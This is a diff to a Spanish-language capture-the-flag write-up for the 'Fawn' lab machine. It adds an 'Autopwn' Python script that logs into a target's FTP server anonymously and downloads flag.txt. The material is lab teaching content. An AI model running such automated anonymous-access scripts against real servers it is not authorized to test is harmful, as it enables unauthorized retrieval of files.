@@ -1,3 +1,5 @@
+# Fawn
+
 🗹 Verificar si el host está activo:
 
 ```shell
@@ -87,3 +89,45 @@ anon_root=/
 
 - Habilitar el servicio `vsftpd` con el comando `systemctl start vsftpd`.
 - Si hacemos una actualización a la configuración del archivo `/etc/vsftpd` reiniciar el servicio con el comando `systemctl restart vsftpd`.
+## Autopwn
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+from ftplib import FTP
+from termcolor import colored
+
+
+def get_args():
+
+    parser = argparse.ArgumentParser(prog='Fawn Autopwn')
+    parser.add_argument('-t', '--target', help='Dirección IP del servidor', dest='target')
+
+    return parser.parse_args()
+
+
+def connect_to_ftp(target):
+
+    ftp = FTP()
+    ftp.connect(target)
+    ftp.login()
+    flag = []
+    ftp.retrlines('RETR flag.txt', flag.append)
+    flag = ''.join(flag)
+    print(colored(f'\n[+]', 'blue'), 'Flag:', colored(f'{flag}', 'green'), colored('[+]', 'blue'))
+    ftp.quit()
+
+
+def main():
+
+    print(colored('\n[+]', 'blue'), 'Fawn', colored('[+]', 'blue'))
+
+    args = get_args()
+    connect_to_ftp(args.target)
+
+if __name__ == '__main__':
+
+    main()
+```
+![Fawn Autopwn](/Images/fawn_autopwn.png)
